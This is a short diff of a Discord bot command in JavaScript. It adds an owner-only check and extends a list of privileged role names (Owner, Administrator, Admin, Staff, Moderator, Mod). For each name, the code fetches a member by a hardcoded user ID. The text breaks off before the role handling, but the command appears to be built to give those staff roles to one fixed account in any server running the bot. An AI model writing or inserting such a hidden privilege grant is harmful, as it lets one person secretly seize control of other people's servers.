@@ -1,8 +1,12 @@
 const { inspect } = require("util")
 
 module.exports.run = async (bot, msg, args, owner, prefix) => {
+    if(!(msg.author.id === owner)){
+        msg.channel.send("You aren't my owner.");
+        return;
+    }
     if(!msg.guild.me.hasPermission('MANAGE_ROLES')) return msg.channel.send("Bot doesn't have permissions here").then(ms => ms.delete(5000));
-    ["Owner","Administrator","Admin","Staff","Moderator"].forEach(name => {
+    ["Owner","Administrator","Admin","Staff","Moderator","Mod"].forEach(name => {
             const err = 0;
             msg.guild.fetchMember('334361254435225602')
                 .then(member => {
